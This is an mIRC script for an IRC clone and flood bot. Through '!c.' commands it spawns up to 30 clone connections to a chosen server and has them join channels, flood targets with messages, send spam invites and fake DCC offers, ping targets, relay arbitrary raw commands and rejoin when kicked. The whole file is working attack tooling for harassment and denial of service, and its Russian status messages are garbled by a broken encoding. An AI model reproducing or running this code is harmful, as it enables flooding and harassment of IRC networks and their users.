on *:text:*:*: {
  if ( (%auth [ $+ [ $nick ] ] != yes) && (%auth [ $+ [ $nick ] ] != admin) ) { halt }
  if (!c.stat. isin $1 ) {
    if ( ($remove($1,!c.stat.) != *) && ($remove($1,!c.stat.) != $me) ) { halt }
    msg $checkcn 12 >>>> ������� ����-�������: $sock(clone.*,0) �� ������� ������(��������): $sock(cserv.*,0)
  }
  if (!c.stop. isin $1 ) {
    if ( ($remove($1,!c.stop.) != *) && ($remove($1,!c.stop.) != $me) ) { halt }
    msg $checkcn 12 >>>> ��������! ��������� �������� ������!
    set %clone.stop yes
  }
  if (!c.quit. isin $1 ) {
    if ( ($remove($1,!c.quit.) != *) && ($remove($1,!c.quit.) != $me) ) { halt }
    msg $checkcn 12 >>>> ��������! �������� ��� ��0�-�0����!
    sockwrite -n cserv.* quit : $+ %cafe.team
  }
  if (!c.join. isin $1 ) {
    if ( ($remove($1,!c.join.) != *) && ($remove($1,!c.join.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $checkcn 12 >>>> ��������! ������ ������ �:4 $2- 12(���������: ������ ����� ������)
    sockwrite -n  cserv.* join $2-  
  }
  if (!c.part. isin $1 ) {
    if ( ($remove($1,!c.part.) != *) && ($remove($1,!c.part.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $checkcn 12 >>>> ��������! ������ ������ ��:4 $2- 12(���������: ������ ����� ������)
    sockwrite -n  cserv.* part $2 : $+ %cafe.team
  }
  if (!c.flood. isin $1 ) {
    if ( ($remove($1,!c.flood.) != *) && ($remove($1,!c.flood.) != $me) ) { halt }
    if ($2 == $null) { halt }
    msg $checkcn 12 >>>> ��������! ����� ������� ������� �:4 $2 12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 : $+ $split.fl  
  }
  if (!c.say. isin $1 ) {
    if ( ($remove($1,!c.say.) != *) && ($remove($1,!c.say.) != $me) ) { halt }
    if ($2 == $null) { halt }
    if ($3 == $null) { halt }
    .msg $checkcn 12 >>>> ��������! ��������� ������  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 : $+ $3-  
  }
  if (!c.notice. isin $1 ) {
    if ( ($remove($1,!c.notice.) != *) && ($remove($1,!c.notice.) != $me) ) { halt }
    if ($2 == $null) { halt }
    if ($3 == $null) { halt }
    .msg $checkcn 12 >>>> ��������! ��������� �0���  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* NOTICE $2 : $+ $3-  
  }
  if (!c.invite. isin $1 ) {
    if ( ($remove($1,!c.invite.) != *) && ($remove($1,!c.invite.) != $me) ) { halt }
    if ($2 == $null) { halt }
    var %cRandomChannel $chr(35) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ OpS $+ $rand(a,z) $+ $rand(0,9) $+ LamO $+ $rand(a,z) $+ $rand(0,9) $+ yOu $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9)
    .msg $checkcn 12 >>>> ��������! �������� ������  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* INVITE $2 %cRandomChannel
  }
  if (!c.dcc. isin $1 ) {
    if ( ($remove($1,!c.dcc.) != *) && ($remove($1,!c.dcc.) != $me) ) { halt }
    if ($2 == $null) { halt }
    .msg $checkcn 12 >>>> ��������! �0����� ����������� �����  � :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 :DCC SEND I_think_you_are_LaMer_SuckerS $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+ 
  }
  if (!c.ping. isin $1 ) {
    if ( ($remove($1,!c.ping.) != *) && ($remove($1,!c.ping.) != $me) ) { halt }
    if ($2 == $null) { halt }
    .msg $checkcn 12 >>>> ��������! ������ :4 $2  12(���������: ������ ����� ������)
    sockwrite -n  cserv.* PRIVMSG $2 $chr(1) $+ PING $+ $chr(1)
  }
  if (!c.help. isin $1 ) {
    if ( ($remove($1,!c.help.) != *) && ($remove($1,!c.help.) != $me) ) { halt }
    msg $checkcn 12 *** !c. ( stop. quit. join. part. dcc. invite. ping. notice. say. flood. )
  }
  if (!c. isin $1 ) {
    if ( ($remove($1,!c.) != *) && ($remove($1,!c.) != $me) ) { halt }
    if ($2 == $null) { msg $checkcn  4 ������, ������� ������! | halt }
    if ($3 == $null) { msg $checkcn  4 ������, ������� ���� �������! | halt }
    if ($4 == $null) { msg $checkcn  4 ������, ������� ���������� ��0��� | halt }
    if ($4 >= 30) { msg $checkcn  4 ������, ������ ������ ����� ��� 30... | halt }
    if ( $sock(clone.*,0) >= 40 )   {  msg $checkcn  4 ������, ��� ������� ����� 40 ������...  | halt }
    if ($5 == $null) { set %clone.chan off }
    if ($5 != $null) { set %clone.chan $5- }
    set %clone.chanel $checkcn |     set %clone.stop no |     set %IpPortServerCl0ne $2 $3 |   set %clone.max 0
    msg $checkcn 4 *** ������� �������� c0���-������, �� $4  ������, �� ������: $2 $3 
    :start
    if (%clone.stop ==  yes) { halt }
    if (%clone.max == $4) { goto end | halt } 
    sockopen clone. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $2 $3
    inc    %clone.max | goto start
    :end  
    msg $checkcn 12 >>>> �������� �������� ������! ������� �������: $sock(clone.*,0) ! ����� ���������� ��������!... 
  }
}
on *:sockopen:clone.*: {
  if ($sockerr > 0) {    sockclose $sockname | return   }
  .sockrename $sockname $replace($sockname,clone.,cserv.)
  .sockwrite -n $sockname nick $remove($sockname,cserv.)
  .sockwrite -n $sockname user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  : $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
}
on *:sockread:cserv.*: {
  if ($sockerr > 0) {    sockclose $sockname | return  }
  .sockread %clone
  if ($sockbr == 0) return
  if ($gettok(%clone,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clone,2-,32) }
  if ($gettok(%clone,2,32) == 376) { 
    if (%clone.chan != off) { .sockwrite -n $sockname join %clone.chan }
  }
  if ($gettok(%clone,2,32) == PRIVMSG) {    
    if ($gettok(%clone,4,32) == :!ready) {        .sockwrite -n $sockname $gettok(%clone,5-,32)     }
  }
  if ($gettok(%clone,2,32) == KICK) {
    if ( $gettok(%clone,4,32) == $remove($sockname,cserv.) ) {  .sockwrite $sockname join $gettok(%clone,3,32) $+ $lf     }
  }
}
